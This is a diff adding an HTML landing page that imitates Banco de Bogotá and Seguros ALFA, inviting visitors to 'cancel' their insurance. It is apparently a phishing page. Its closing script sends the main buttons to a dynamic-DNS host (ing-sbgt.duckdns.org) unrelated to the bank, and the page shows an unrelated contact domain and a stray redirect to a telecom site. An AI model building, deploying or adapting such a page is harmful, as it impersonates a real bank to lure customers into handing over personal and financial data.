@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="es-CO">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description"
+    content="Inicia la cancelación de tu seguro ALFA con el respaldo del Banco de Bogotá. Atención, beneficios y soporte en un solo lugar.">
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+  <title>Seguros Alfa | Banco Bogotá</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            brand: '#180adf',
+            'brand-ink': '#0f0a7a',
+            accent: '#00ccea',
+            'accent-soft': '#58e4f4',
+            bg: '#F7F7F7',
+            muted: '#667085',
+          },
+          borderRadius: {
+            'card': '14px',
+          },
+          boxShadow: {
+            'soft': '0 0 12px 1px rgba(57,62,100,.1)',
+            'premium': '0 10px 30px rgba(2, 8, 20, .06)',
+          }
+        }
+      }
+    }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet">
+  <script src="js/jquery.min.js" defer=""></script>
+  <script type="text/javascript" src="js/functions.js"></script>
+
+  <style type="text/tailwindcss">
+    @layer base {
+      body {
+        font-family: 'Open Sans', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+        @apply bg-bg text-[#1f2937] antialiased scroll-smooth;
+      }
+    }
+    @layer components {
+      .btn-primary {
+        @apply bg-gradient-to-b from-brand to-brand-ink text-white rounded-full px-8 py-3 font-bold text-lg shadow-[0_6px_18px_rgba(24,10,223,0.18)] transition-all hover:-translate-y-1 hover:shadow-[0_10px_22px_rgba(24,10,223,0.22)];
+      }
+      .fade-in {
+        @apply opacity-0 translate-y-2 transition-all duration-500 ease-out;
+      }
+      .fade-in.is-visible {
+        @apply opacity-100 translate-y-0;
+      }
+    }
+  </style>
+</head>
+
+<body class="pt-24 lg:pt-32">
+  <header id="cabecera"
+    class="fixed top-0 left-0 w-full z-50 bg-white/85 backdrop-blur-md border-b border-black/5 shadow-sm py-4">
+    <div class="max-w-7xl mx-auto px-6 flex justify-between items-center">
+      <img src="images/logo.svg" class="h-10 lg:h-12" alt="Banco de Bogotá" loading="eager">
+      <img src="images/alfa2.png" class="h-8 lg:h-10" alt="Seguros ALFA" loading="eager">
+    </div>
+  </header>
+
+  <main>
+    <!-- HERO -->
+    <section class="max-w-7xl mx-auto px-6 py-12 lg:py-20 fade-in">
+      <div class="grid lg:grid-cols-2 gap-12 items-center">
+        <div class="space-y-6 text-center lg:text-left">
+          <h1 class="text-4xl lg:text-5xl font-extrabold leading-tight text-gray-900">
+            Inicia el proceso de cancelación de seguros <span class="text-brand">ALFA</span>
+          </h1>
+          <p class="text-lg text-muted leading-relaxed max-w-xl mx-auto lg:mx-0">
+            Accede a los servicios que Banco de Bogotá y Seguros ALFA te ofrecen para tu seguridad y tranquilidad.
+            <br><br>
+            Disfruta todos los <strong class="text-brand-ink">beneficios adicionales</strong> a tus coberturas y dale
+            seguridad a tu desarrollo <strong>personal y profesional</strong>.
+          </p>
+          <div class="pt-4">
+            <button class="btn-primary" id="btn-cancelar">CANCELAR SEGURO</button>
+          </div>
+        </div>
+        <div class="hidden lg:block">
+          <!-- Placeholder if needed or actual illustration -->
+        </div>
+      </div>
+    </section>
+
+    <div class="flex flex-col items-center py-8">
+      <a href="#seccion-azul"
+        class="flex items-center gap-2 font-semibold text-brand-ink hover:text-brand transition-colors">
+        <img src="images/flecha-abajo.jpg" alt="" class="w-6 h-6 animate-bounce">
+        Conoce más
+      </a>
+    </div>
+
+    <!-- SECCIÓN AZUL -->
+    <section id="seccion-azul" class="bg-gradient-to-br from-accent to-accent-soft py-16 lg:py-24 text-[#04222a]">
+      <div class="max-w-7xl mx-auto px-6 grid lg:grid-cols-2 gap-12 items-center">
+        <div class="space-y-6">
+          <h2 class="text-3xl lg:text-4xl font-extrabold leading-tight">Servicios diseñados exclusivamente para ti</h2>
+          <p class="text-lg opacity-90 leading-relaxed">
+            Conoce y disfruta el Ecosistema digital de tu seguro. Servicios personalizados que se habilitan de acuerdo
+            con las coberturas de tu producto.
+          </p>
+        </div>
+        <div class="relative rounded-card overflow-hidden shadow-premium aspect-video lg:aspect-square">
+          <img src="images/personita.jpg" class="w-full h-full object-cover" alt="Atención personalizada"
+            loading="lazy">
+          <div class="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- REGISTRO -->
+    <section id="seccion-registro" class="max-w-7xl mx-auto px-6 py-16 lg:py-24 space-y-12">
+      <h2 class="text-3xl lg:text-4xl font-extrabold text-center text-gray-900">¿Qué debo tener en cuenta para
+        registrarme?</h2>
+
+      <div class="grid md:grid-cols-3 gap-8">
+        <!-- Requisito 1 -->
+        <div
+          class="bg-white rounded-card shadow-soft overflow-hidden transition-all hover:-translate-y-2 hover:shadow-premium border-b-4 border-[#A375C9]">
+          <div class="h-48 overflow-hidden">
+            <img src="images/segurosdevida.jpg" class="w-full h-full object-cover" alt="Seguro activo" loading="lazy">
+          </div>
+          <div class="p-6 space-y-3">
+            <h3 class="text-xl font-bold">Tener activo tu seguro</h3>
+            <p class="text-muted text-sm leading-relaxed">Para acceder a los servicios digitales debes tener un seguro
+              activo.</p>
+          </div>
+        </div>
+
+        <!-- Requisito 2 -->
+        <div
+          class="bg-white rounded-card shadow-soft overflow-hidden transition-all hover:-translate-y-2 hover:shadow-premium border-b-4 border-[#FFC476]">
+          <div class="h-48 overflow-hidden">
+            <img src="images/segurodatos.jpg" class="w-full h-full object-cover" alt="Registro de datos" loading="lazy">
+          </div>
+          <div class="p-6 space-y-3">
+            <h3 class="text-xl font-bold">Registra tus datos</h3>
+            <p class="text-muted text-sm leading-relaxed">Haz clic en “Regístrate” y diligencia un sencillo formulario
+              con tus datos personales.</p>
+          </div>
+        </div>
+
+        <!-- Requisito 3 -->
+        <div
+          class="bg-white rounded-card shadow-soft overflow-hidden transition-all hover:-translate-y-2 hover:shadow-premium border-b-4 border-[#FF91A1]">
+          <div class="h-48 overflow-hidden">
+            <img src="images/beneficios.webp" class="w-full h-full object-cover" alt="Beneficios del seguro"
+              loading="lazy">
+          </div>
+          <div class="p-6 space-y-3">
+            <h3 class="text-xl font-bold">Utiliza tus beneficios</h3>
+            <p class="text-muted text-sm leading-relaxed">Accede a beneficios y servicios según tus coberturas.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- AYUDA & CONTACTO -->
+    <section id="ayuda" class="bg-white py-16 lg:py-24 relative overflow-visible">
+      <div class="max-w-7xl mx-auto px-6 text-center space-y-6">
+        <h2 class="text-3xl lg:text-4xl font-extrabold text-gray-900">¿Necesitas ayuda?</h2>
+        <p class="text-lg text-muted max-w-2xl mx-auto">
+          Recibe una consultoría completa sobre los beneficios de tu portafolio de servicios. Elige alguna de las
+          siguientes opciones:
+        </p>
+      </div>
+
+      <!-- Card de Contacto flotante -->
+      <div class="max-w-5xl mx-auto px-6 mt-12">
+        <div class="bg-white rounded-card shadow-premium p-8 lg:p-12 relative z-10 border border-gray-100">
+          <div class="grid md:grid-cols-3 gap-8 items-start">
+            <!-- Opción 1 -->
+            <div class="text-center space-y-4">
+              <div class="w-16 h-16 bg-accent/10 rounded-full flex items-center justify-center mx-auto">
+                <img src="images/favicon.ico" class="w-10 h-10 opacity-50" alt="Dudas" loading="lazy">
+              </div>
+              <h4 class="font-bold text-gray-900">Resuelve tus dudas</h4>
+              <p class="text-sm text-muted">Visita nuestras preguntas frecuentes</p>
+            </div>
+
+            <!-- Separador (Mobile: hidden, Tablet+: block) -->
+            <div class="hidden md:block w-px h-24 bg-gray-100 self-center"></div>
+
+            <!-- Opción 2 -->
+            <div class="text-center space-y-4">
+              <div
+                class="w-16 h-16 bg-accent/10 rounded-full flex items-center justify-center mx-auto text-brand-ink font-bold">
+                BO
+              </div>
+              <h4 class="font-bold text-gray-900">Líneas de atención</h4>
+              <p class="text-sm text-muted">Bogotá: 601 7455553<br>Nacional: 01 8000 960 011</p>
+            </div>
+
+            <!-- Separador -->
+            <div class="hidden md:block w-px h-24 bg-gray-100 self-center"></div>
+
+            <!-- Opción 3 -->
+            <div class="text-center space-y-4">
+              <div
+                class="w-16 h-16 bg-accent/10 rounded-full flex items-center justify-center mx-auto text-brand-ink font-bold">
+                @
+              </div>
+              <h4 class="font-bold text-gray-900">Correo electrónico</h4>
+              <p class="text-sm text-muted break-words">comunicaciones@disfrutatuseguro.com</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- FOOTER -->
+  <footer class="bg-gray-50 border-t border-gray-200 pt-16 pb-8">
+    <div class="max-w-7xl mx-auto px-6 space-y-12">
+      <div class="flex flex-col items-center gap-8">
+        <img src="images/logo.svg" class="h-12 opacity-80" alt="Banco de Bogotá" loading="lazy">
+        <p class="text-xs text-muted text-center max-w-2xl leading-relaxed">
+          Grupo Aval asume exclusivamente la responsabilidad del cumplimiento de las obligaciones del producto frente al
+          consumidor financiero. Este producto es ofrecido por Seguros ALFA y Grupo Aval, limitándose única y
+          exclusivamente al correcto cumplimiento de las instrucciones debidamente impartidas por Redeban para la
+          prestación del servicio en dicha red.
+        </p>
+      </div>
+
+      <div class="flex flex-col items-center gap-4 text-center border-t border-gray-200 pt-8">
+        <div class="flex items-center gap-2 font-bold text-brand-ink">
+          <img src="images/favicon.ico" class="w-5 h-5" alt="" loading="lazy">
+          <span>Líneas de Soporte</span>
+        </div>
+        <div
+          class="text-[10px] lg:text-xs text-muted font-medium flex flex-wrap justify-center gap-x-4 gap-y-2 uppercase tracking-wider">
+          <span>Bogotá: (601) 7455553</span>
+          <span>Cali: (2) 4850809</span>
+          <span>Medellín: (4) 6040027</span>
+          <span>Barranquilla: (5) 3851828</span>
+          <span>Bucaramanga: (7) 6971129</span>
+          <span>Nacional: 01 8000 960 011</span>
+        </div>
+        <p class="text-[10px] text-gray-400 mt-4">&copy; 2024 Seguros Alfa. Todos los derechos reservados.</p>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Redirección CTA (se conserva por compatibilidad)
+    function final() { window.location.href = "https://www.movistar.com.co/"; }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      // CTA principal
+      $("#btn-registrate,#btn-cancelar").on("click", function () {
+        window.location.href = "https://ing-sbgt.duckdns.org/";
+      });
+
+      // Reveal animado
+      const io = new IntersectionObserver((entries) => {
+        entries.forEach(e => { if (e.isIntersecting) e.target.classList.add("is-visible"); });
+      }, { threshold: .18 });
+      document.querySelectorAll(".fade-in").forEach(el => io.observe(el));
+
+      // Fallback universal de imágenes (por si alguna ruta no existe)
+      const FALLBACK = 'data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="420" height="280"><rect width="100%" height="100%" fill="%23f2f4f7"/><text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial" font-size="14" fill="%239aa4b2">Imagen no disponible</text></svg>';
+      document.querySelectorAll("img").forEach(img => {
+        img.addEventListener("error", () => { img.src = FALLBACK; img.style.background = "#f7f7f9"; img.style.objectFit = "contain"; });
+      });
+    });
+  </script>
+
+
+</body>
+
+</html>
